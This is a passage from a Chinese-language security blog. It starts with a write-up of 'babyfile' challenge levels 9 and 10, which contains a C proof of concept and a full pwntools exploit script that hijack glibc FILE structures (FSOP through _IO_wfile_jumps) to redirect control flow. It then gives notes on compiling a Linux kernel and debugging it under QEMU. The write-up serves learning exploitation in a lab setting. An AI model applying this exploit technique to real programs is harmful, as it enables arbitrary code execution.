class="type">size_t</span>* wide_vtable_ptr;</span><br><span class="line">    <span class="type">size_t</span>* wide_vtable_addr;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">100</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//0.泄露libc基地址,计算得到_IO_wfile_jumps表的地址</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;function printf @ %p\n&quot;</span>, <span class="built_in">printf</span>);</span><br><span class="line">    libc_base_addr = (<span class="type">char</span>*) <span class="built_in">printf</span> - <span class="number">0x54110</span>;     <span class="comment">// printf offset @ glibc-2.38</span></span><br><span class="line">    _IO_wfile_jumps = (<span class="type">char</span>*)libc_base_addr + <span class="number">0x1d5268</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;_IO_wfile_jumps @ %p\n&quot;</span>,_IO_wfile_jumps);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//1.构造fake_wide_vtable,使用win填充</span></span><br><span class="line">    fake_wide_vtable = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">20</span>;++i)&#123;</span><br><span class="line">        fake_wide_vtable[i]=_IO_wfile_jumps[i];</span><br><span class="line">    &#125;</span><br><span class="line">    fake_wide_vtable[<span class="number">13</span>] = (<span class="type">size_t</span>)win;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//2.构造fake_wide_data,使得其偏移0xe0处的_wide_vtable指针,指向1中构造的fake_wide_vtable</span></span><br><span class="line">    fake_wide_data = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    fake_wide_data[<span class="number">28</span>] = fake_wide_vtable;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//3.修改FILE.flag |= ~(_IO_CURRENTLY_PUTTING | _IO_NO_WRITES | _IO_UNBUFFERED) </span></span><br><span class="line">    fp = fopen(<span class="string">&quot;./flag&quot;</span>,<span class="string">&quot;w&quot;</span>);</span><br><span class="line">    fp-&gt;_flags |= ~(<span class="number">0x800</span> | <span class="number">0x8</span> | <span class="number">2</span>);</span><br><span class="line">    <span class="comment">// fp-&gt;_IO_read_ptr =0;</span></span><br><span class="line">    <span class="comment">// fp-&gt;_IO_read_end =0;</span></span><br><span class="line">    fp-&gt;_IO_write_ptr =<span class="number">1</span>;</span><br><span class="line">    fp-&gt;_IO_write_end =<span class="number">0</span>;</span><br><span class="line">    fp-&gt;_mode=<span class="number">0</span>;</span><br><span class="line">    <span class="comment">// fp-&gt;_IO_buf_base =0;</span></span><br><span class="line">    <span class="comment">// fp-&gt;_IO_buf_end =0;</span></span><br><span class="line">    <span class="comment">// fp-&gt;_IO_save_base =0;</span></span><br><span class="line">    <span class="comment">// fp-&gt;_IO_backup_base =0;</span></span><br><span class="line">    <span class="comment">// fp-&gt;_IO_save_end =0;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//4.修改FILE.vtable指向3中泄露的_IO_wfile_jumps</span></span><br><span class="line">    vtable_ptr = (<span class="type">char</span>*)fp + <span class="number">0xd8</span>;</span><br><span class="line">    *vtable_ptr = _IO_wfile_jumps;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//5.修改FILE._wide_data指向2中构造的fake_wide_data</span></span><br><span class="line">    wide_data_ptr = (<span class="type">char</span>*)fp + <span class="number">0xa0</span>;</span><br><span class="line">    *wide_data_ptr = fake_wide_data;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//6.stdout指向fp</span></span><br><span class="line">    <span class="built_in">stdout</span> = fp;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//7.trigger</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在win上下断点发现win确实可以调用,但是win中的puts会递归调用到win</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bt</span><br><span class="line"><span class="comment">#0  win () at stdout.c:4</span></span><br><span class="line"><span class="comment">#1  0x00007ffff7e4a5a6 in __GI__IO_wdoallocbuf (fp=fp@entry=0x4058d0) at ./libio/wgenops.c:369</span></span><br><span class="line"><span class="comment">#2  0x00007ffff7e4c2ad in __GI__IO_wfile_overflow (f=0x4058d0, wch=1668183398) at ./libio/wfileops.c:421</span></span><br><span class="line"><span class="comment">#3  0x00007ffff7e4a472 in __GI___woverflow (wch=1668183398, f=0x4058d0) at ./libio/libioP.h:1030</span></span><br><span class="line"><span class="comment">#4  __GI__IO_wdefault_xsputn (n=&lt;optimized out&gt;, data=&lt;optimized out&gt;, f=&lt;optimized out&gt;) at ./libio/wgenops.c:315</span></span><br><span class="line"><span class="comment">#5  __GI__IO_wdefault_xsputn (f=f@entry=0x4058d0, data=&lt;optimized out&gt;, n=n@entry=19) at ./libio/wgenops.c:282</span></span><br><span class="line"><span class="comment">#6  0x00007ffff7e4cecb in __GI__IO_wfile_xsputn (n=19, data=&lt;optimized out&gt;, f=0x4058d0) at ./libio/wfileops.c:1010</span></span><br><span class="line"><span class="comment">#7  __GI__IO_wfile_xsputn (f=0x4058d0, data=&lt;optimized out&gt;, n=19) at ./libio/wfileops.c:956</span></span><br><span class="line"><span class="comment">#8  0x00007ffff7e476b5 in __GI__IO_puts (str=0x402004 &quot;function win called&quot;) at ./libio/libioP.h:1030</span></span><br><span class="line"><span class="comment">#9  0x0000000000401179 in win () at stdout.c:4</span></span><br><span class="line"><span class="comment">#10 0x00007ffff7e4a5a6 in __GI__IO_wdoallocbuf (fp=fp@entry=0x4058d0) at ./libio/wgenops.c:369</span></span><br><span class="line"><span class="comment">#11 0x00007ffff7e4c2ad in __GI__IO_wfile_overflow (f=0x4058d0, wch=1668183398) at ./libio/wfileops.c:421</span></span><br><span class="line"><span class="comment">#12 0x00007ffff7e4a472 in __GI___woverflow (wch=1668183398, f=0x4058d0) at ./libio/libioP.h:1030</span></span><br><span class="line"><span class="comment">#13 __GI__IO_wdefault_xsputn (n=&lt;optimized out&gt;, data=&lt;optimized out&gt;, f=&lt;optimized out&gt;) at ./libio/wgenops.c:315</span></span><br><span class="line"><span class="comment">#14 __GI__IO_wdefault_xsputn (f=f@entry=0x4058d0, data=&lt;optimized out&gt;, n=n@entry=19) at ./libio/wgenops.c:282</span></span><br><span class="line"><span class="comment">#15 0x00007ffff7e4cecb in __GI__IO_wfile_xsputn (n=19, data=&lt;optimized out&gt;, f=0x4058d0) at ./libio/wfileops.c:1010</span></span><br><span class="line"><span class="comment">#16 __GI__IO_wfile_xsputn (f=0x4058d0, data=&lt;optimized out&gt;, n=19) at ./libio/wfileops.c:956</span></span><br><span class="line"><span class="comment">#17 0x00007ffff7e476b5 in __GI__IO_puts (str=0x402004 &quot;function win called&quot;) at ./libio/libioP.h:1030</span></span><br><span class="line"><span class="comment">#18 0x0000000000401179 in win () at stdout.c:4</span></span><br><span class="line"><span class="comment">#19 0x00007ffff7e4a5a6 in __GI__IO_wdoallocbuf (fp=fp@entry=0x4058d0) at ./libio/wgenops.c:369</span></span><br><span class="line"><span class="comment">#20 0x00007ffff7e4c2ad in __GI__IO_wfile_overflow (f=0x4058d0, wch=1668183398) at ./libio/wfileops.c:421</span></span><br><span class="line"><span class="comment">#21 0x00007ffff7e4a472 in __GI___woverflow (wch=1668183398, f=0x4058d0) at ./libio/libioP.h:1030</span></span><br><span class="line"><span class="comment">#22 __GI__IO_wdefault_xsputn (n=&lt;optimized out&gt;, data=&lt;optimized out&gt;, f=&lt;optimized out&gt;) at ./libio/wgenops.c:315</span></span><br><span class="line"><span class="comment">#23 __GI__IO_wdefault_xsputn (f=f@entry=0x4058d0, data=&lt;optimized out&gt;, n=n@entry=19) at ./libio/wgenops.c:282</span></span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>

<p>虽然上述poc验证了这个悲剧</p>
<p>但是这个poc也给我另一个想法</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//6.stdout指向fp</span></span><br><span class="line"><span class="built_in">stdout</span> = fp;</span><br></pre></td></tr></table></figure>

<p>如果在这里我们保持stdout的完整性,只是改变其后继指针<code>_chain</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//6.fp借助stdout上链</span><br><span class="line">stdout -&gt; _chain = fp;</span><br></pre></td></tr></table></figure>

<p>然后在程序退出时利用<code>FSOP</code>的机制, win就会被调用, 实验证明确实如此</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Destroyer)-[/mnt/c/Users/xidian/Desktop/pwncollege/file/test]</span><br><span class="line">└─# ./stdout</span><br><span class="line"><span class="keyword">function</span> <span class="built_in">printf</span> @ 0x7f220bf40110</span><br><span class="line">_IO_wfile_jumps @ 0x7f220c0c1268</span><br><span class="line">hello</span><br><span class="line"><span class="keyword">function</span> win called</span><br></pre></td></tr></table></figure>
</blockquote>
<p>一个<code>struct _IO_FILE_plus</code>大小是<code>0xe0 B</code>,两个就是<code>0x1c0 B</code></p>
<p>而<code>level9</code>允许我们写入<code>0x1e0 B</code>,能放开两个<code>struct _IO_FILE_plus</code>还能剩下<code>0x20 B</code>空间用于布置<code>wide_data</code>和<code>wide_vtable</code></p>
<p>溢出时<code>stdout</code>首当其冲, 我们需要保持其<code>flag </code>, <code>vtable</code>不变 , 并且给其<code>lock</code>找一个合适的地方(一个可写且值为0的地方)</p>
<p>接下来的溢出会毁坏<code>libc</code>中的一些数据, 但是不会影响到控制流, 狠狠搞坏它</p>
<p>画在图上意思意思</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241007211929871.png" alt="stdout-&gt;_chain = fake_fp"></p>
<p><strong>exp</strong></p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p = process(<span class="string">&quot;./babyfile_level9&quot;</span>)</span><br><span class="line"></span><br><span class="line">authenticated_addr = <span class="number">0x401866</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#1.泄露libc基地址</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;[LEAK] The address of puts() within libc is: &#x27;</span>)</span><br><span class="line">puts_addr = p.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop = <span class="literal">True</span>)</span><br><span class="line">puts_addr = <span class="built_in">int</span>(puts_addr,<span class="number">16</span>)</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span> , puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">stdout_addr = libc_base + libc.dump(<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>)</span><br><span class="line">_IO_file_jumps_addr = libc_base + libc.dump(<span class="string">&#x27;_IO_file_jumps&#x27;</span>)</span><br><span class="line">_IO_wfile_jumps_addr = libc_base + libc.dump(<span class="string">&#x27;_IO_wfile_jumps&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#2.fake_fp应该跟在stdout之后</span></span><br><span class="line">fake_fp_addr = stdout_addr + <span class="number">0xe0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;stdout @ &quot;</span>,<span class="built_in">hex</span>(stdout_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;fake_fp @ &quot;</span>,<span class="built_in">hex</span>(fake_fp_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;fake_fp_addr - stdout_addr = &quot;</span>,<span class="built_in">hex</span>(fake_fp_addr - stdout_addr))</span><br><span class="line"></span><br><span class="line">fake_wide_data_addr = fake_fp_addr + <span class="number">0xe0</span> - <span class="number">0xe0</span></span><br><span class="line">fake_IO_wdoallocbuf_addr = fake_fp_addr + <span class="number">0xe0</span> + <span class="number">8</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;fake_IO_wdoallocbuf_addr @ &quot;</span>,<span class="built_in">hex</span>(fake_IO_wdoallocbuf_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment">#3.构造stdout_fp,保证其flags,fileno不变</span></span><br><span class="line"><span class="comment">#lock指向一个可写值为0的地方,比如fake_fp_addr-&gt;read_buf_ptr</span></span><br><span class="line"><span class="comment">#chain指向紧跟在后边的fake_fp</span></span><br><span class="line"><span class="comment">#vtable保持使用默认的_IO_file_jumps_addr</span></span><br><span class="line">fake_stdout_fp = FileStructure()</span><br><span class="line">fake_stdout_fp.flags = <span class="number">0xfbad2887</span></span><br><span class="line">fake_stdout_fp.fileno = <span class="number">1</span></span><br><span class="line">fake_stdout_fp.chain = fake_fp_addr</span><br><span class="line">fake_stdout_fp._lock = fake_fp_addr + <span class="number">0x8</span></span><br><span class="line">fake_stdout_fp.vtable = _IO_file_jumps_addr</span><br><span class="line"></span><br><span class="line"><span class="comment">#4.构造fake_fp,</span></span><br><span class="line"><span class="comment">#根据FSOP的条件构造其成员</span></span><br><span class="line">fake_fp = FileStructure()</span><br><span class="line">fake_fp.flags = ~(<span class="number">0x800</span> | <span class="number">0x8</span> | <span class="number">0x2</span>)</span><br><span class="line">fake_fp._IO_write_ptr = <span class="number">1</span></span><br><span class="line">fake_fp._IO_write_end =<span class="number">0</span></span><br><span class="line">fake_fp._lock = fake_fp_addr + <span class="number">0x10</span></span><br><span class="line">fake_fp.vtable = _IO_wfile_jumps_addr</span><br><span class="line">fake_fp._wide_data = fake_wide_data_addr   </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(fake_stdout_fp)</span><br><span class="line"><span class="built_in">print</span>(fake_fp)</span><br><span class="line"></span><br><span class="line">payload =<span class="built_in">bytes</span>(fake_stdout_fp) + <span class="built_in">bytes</span>(fake_fp) + p64(fake_IO_wdoallocbuf_addr - <span class="number">0x68</span>) + p64(authenticated_addr) +p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(proc.pidof(p)[<span class="number">0</span>])</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>





<h3 id="level10"><a href="#level10" class="headerlink" title="level10"></a>level10</h3><p>相比于level8,多了一步</p>
<p>在调用wide_vtable函数时需要传递字符串参数</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2024/05/21/%E5%86%85%E6%A0%B8%E8%B0%83%E8%AF%95/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
      <meta itemprop="name" content="dustball">
      <meta itemprop="description" content="dustland">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="dustland">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/05/21/%E5%86%85%E6%A0%B8%E8%B0%83%E8%AF%95/" class="post-title-link" itemprop="url">kernel</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2024-05-21 17:19:00" itemprop="dateCreated datePublished" datetime="2024-05-21T17:19:00+08:00">2024-05-21</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2024-07-05 17:22:59" itemprop="dateModified" datetime="2024-07-05T17:22:59+08:00">2024-07-05</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="内核调试"><a href="#内核调试" class="headerlink" title="内核调试"></a>内核调试</h1><p>[TOC]</p>
<h2 id="调试环境"><a href="#调试环境" class="headerlink" title="调试环境"></a>调试环境</h2><h3 id="编译内核"><a href="#编译内核" class="headerlink" title="编译内核"></a>编译内核</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cd /usr/src</span><br><span class="line">wget https://mirrors.tuna.tsinghua.edu.cn/kernel/v6.x/linux-6.7.tar.gz</span><br><span class="line">tar -xzf linux-6.7.tar.gz</span><br><span class="line">cd linux-6.7</span><br><span class="line">make menuconfig</span><br></pre></td></tr></table></figure>

<p>Kernel hakcing-&gt;</p>
<p>Compile-time checks and compiler options-&gt;</p>
<p>Debug information-&gt;Rely on the toolchain’s implicit default DWARF version</p>
<p>或者矮人4或者矮人5格式的调试信息都可以,只要是带着调试信息就可</p>
<p>配置完成之后</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make -j$(<span class="built_in">nproc</span>)</span><br></pre></td></tr></table></figure>

<p>等待编译链接完成之后</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make install</span><br></pre></td></tr></table></figure>

<h3 id="生成文件"><a href="#生成文件" class="headerlink" title="生成文件"></a>生成文件</h3><p>内核的编译链接有三个阶段</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20240222203727335.png" alt="image-20240222203727335"></p>
<h4 id="vmlinux"><a href="#vmlinux" class="headerlink" title="vmlinux"></a>vmlinux</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/usr/src/linux-6.7# find . -name vmlinux</span><br><span class="line">./arch/x86/boot/compressed/vmlinux</span><br><span class="line">./vmlinux</span><br><span class="line">./tools/perf/util/bpf_skel/vmlinux  //这实际是vmlinux.h头文件</span><br></pre></td></tr></table></figure>

<p>根目录下面这个带有调试符号的linux elf,不可以作为引导内核,是第一次编译链接的产物<br /></p>
<p>linux&#x2F;arch&#x2F;x86&#x2F;boot&#x2F;compressed&#x2F;vmlinux这个是和piggy等又链接过的,并且经过了压缩</p>
<h4 id="bzImage"><a href="#bzImage" class="headerlink" title="bzImage"></a>bzImage</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/usr/src/linux-6.7# find . -name bzImage</span><br><span class="line">./arch/x86/boot/bzImage</span><br><span class="line">./arch/x86_64/boot/bzImage</span><br></pre></td></tr></table></figure>

<p>真的bzImage只有一个,只不过x86_64下面这个,是x86这个的链接</p>
<p>linux&#x2F;arch&#x2F;x86&#x2F;boot&#x2F;bzImage这个是最终产物,可以引导</p>
<h4 id="vmlinuz"><a href="#vmlinuz" class="headerlink" title="vmlinuz"></a>vmlinuz</h4><p>内核编译链接完毕后,在项目根目录make install,会在&#x2F;boot&#x2F;下面生成vmlinuz-&lt;版本号&gt;</p>
<p>这个vmlinuz-&lt;版本号&gt;实际上就是bzImage</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/boot# ll /usr/src/linux-6.7/arch/x86/boot/bzImage</span><br><span class="line">-rw-r--r-- 1 root root 11801600 Feb 22 14:44 /usr/src/linux-6.7/arch/x86/boot/bzImage</span><br><span class="line">root@Destroyer:/boot# ll vmlinuz*</span><br><span class="line">-rw-r--r-- 1 root root 11801600 Feb 22 20:42 vmlinuz-6.7.0</span><br><span class="line">-rw-r--r-- 1 root root 11801600 Feb 21 20:00 vmlinuz-6.7.0.old</span><br></pre></td></tr></table></figure>

<h3 id="qemu虚拟机"><a href="#qemu虚拟机" class="headerlink" title="qemu虚拟机"></a>qemu虚拟机</h3><p>qemu的作用类似于vmware,但是可以更自由地配置,调试其上运行的内核</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">git clone https://gitee.com/qemu/qemu.git</span><br><span class="line">cd qemu</span><br><span class="line">mkdir build</span><br><span class="line">cd build</span><br><span class="line">../configure</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>

<p>之后就可以在任意目录使用qemu工具了</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/home/dustball# qemu-</span><br><span class="line">qemu-edid                      qemu-system-i386w.exe          qemu-system-riscv32w.exe</span><br><span class="line">qemu-edid.exe                  qemu-system-loongarch64.exe    qemu-system-riscv64.exe</span><br><span class="line">qemu-ga                        qemu-system-loongarch64w.exe   qemu-system-riscv64w.exe</span><br><span class="line">qemu-ga.exe                    qemu-system-m68k.exe           qemu-system-rx.exe</span><br><span class="line">qemu-img                       qemu-system-m68kw.exe          qemu-system-rxw.exe</span><br><span class="line">qemu-img.exe                   qemu-system-microblaze.exe     qemu-system-s390x.exe</span><br><span class="line">qemu-io                        qemu-system-microblazeel.exe   qemu-system-s390xw.exe</span><br><span class="line">qemu-io.exe                    qemu-system-microblazeelw.exe  qemu-system-sh4.exe</span><br><span class="line">qemu-nbd                       qemu-system-microblazew.exe    qemu-system-sh4eb.exe</span><br><span class="line">qemu-nbd.exe                   qemu-system-mips.exe           qemu-system-sh4ebw.exe</span><br><span class="line">qemu-pr-helper                 qemu-system-mips64.exe         qemu-system-sh4w.exe</span><br><span class="line">qemu-storage-daemon            qemu-system-mips64el.exe       qemu-system-sparc.exe</span><br><span class="line">qemu-storage-daemon.exe        qemu-system-mips64elw.exe      qemu-system-sparc64.exe</span><br><span class="line">qemu-system-aarch64.exe        qemu-system-mips64w.exe        qemu-system-sparc64w.exe</span><br><span class="line">qemu-system-aarch64w.exe       qemu-system-mipsel.exe         qemu-system-sparcw.exe</span><br><span class="line">qemu-system-alpha.exe          qemu-system-mipselw.exe        qemu-system-tricore.exe</span><br><span class="line">qemu-system-alphaw.exe         qemu-system-mipsw.exe          qemu-system-tricorew.exe</span><br><span class="line">qemu-system-arm.exe            qemu-system-nios2.exe          qemu-system-x86_64</span><br><span class="line">qemu-system-armw.exe           qemu-system-nios2w.exe         qemu-system-x86_64.exe</span><br><span class="line">qemu-system-avr.exe            qemu-system-or1k.exe           qemu-system-x86_64w.exe</span><br><span class="line">qemu-system-avrw.exe           qemu-system-or1kw.exe          qemu-system-xtensa.exe</span><br><span class="line">qemu-system-cris.exe           qemu-system-ppc.exe            qemu-system-xtensaeb.exe</span><br><span class="line">qemu-system-crisw.exe          qemu-system-ppc64.exe          qemu-system-xtensaebw.exe</span><br><span class="line">qemu-system-hppa.exe           qemu-system-ppc64w.exe         qemu-system-xtensaw.exe</span><br><span class="line">qemu-system-hppaw.exe          qemu-system-ppcw.exe           qemu-uninstall.exe</span><br><span class="line">qemu-system-i386.exe           qemu-system-riscv32.exe</span><br></pre></td></tr></table></figure>

<p>这里带有system字样的是为了适应不同的架构</p>
<p>有<code>qemu-system-x86_64</code>就够了</p>
<p>qemu-img是创建虚拟磁盘使用的</p>
<p>如下是用qemu启动一个虚拟机的命令</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-x86_64 \</span><br><span class="line">    -m 512M \</span><br><span class="line">    -nographic \</span><br><span class="line">    -kernel ./bzImage \</span><br><span class="line">    -initrd  ./rootfs.img \</span><br><span class="line">    -append <span class="string">&quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 nokaslr&quot;</span> \</span><br><span class="line">    -smp cores=4,threads=2 \</span><br><span class="line">    -cpu kvm64 \</span><br><span class="line">    -s \</span><br></pre></td></tr></table></figure>

<p>其中</p>
<p>-m是虚拟机运行内存</p>
<p>-kernel指定内核镜像文件在本机中的地址</p>
<p><strong>-initrd指定内存文件系统,现在可以理解为磁盘</strong></p>
<p>-append是启动参数</p>
<p>-smp指定多核多线程</p>
<p>-cpu指定虚拟CPU的类型</p>
<p>-s启动调试监听,允许gdb随时远程附加调试</p>
<p>那么什么是”内存文件系统”</p>
<h3 id="内存文件系统"><a href="#内存文件系统" class="headerlink" title="内存文件系统"></a>内存文件系统</h3><p>之前有一次安装kali虚拟机时,第一次开机没有进入到桌面,而是一个(initramfs)的shell</p>
<p>意思是,操作系统内核已经起来了,但是没有挂载根文件系统rootfs</p>
<p>那么什么是内存文件系统,什么是根文件系统呢</p>
<p>首先要明确,内核离了硬盘也是能活着的,可以用其他文件系统比如网络或者内存文件系统</p>
<p>内存文件系统是内核启动过程中使用的临时文件系统,内存文件系统(initrd或者initramfs)也是一个完整的linux目录树,并且在&#x2F;bin下面有一套精简的命令工具集,比如busybox.在sbin下也有相关工具比如insmod,通常也是链接到&#x2F;bin&#x2F;busybox</p>
<p>这些工具在启动过程中可以供内核调用</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/usr/src/busybox<span class="number">-1.36</span><span class="number">.1</span>/_install<span class="meta"># tree -L 1</span></span><br><span class="line">.</span><br><span class="line">├── bin			<span class="comment">//用户工具</span></span><br><span class="line">├── dev</span><br><span class="line">├── etc</span><br><span class="line">├── init		<span class="comment">//开机自动执行的任务脚本</span></span><br><span class="line">├── ktest.ko	</span><br><span class="line">├── linuxrc -&gt; bin/busybox</span><br><span class="line">├── proc</span><br><span class="line">├── sbin		<span 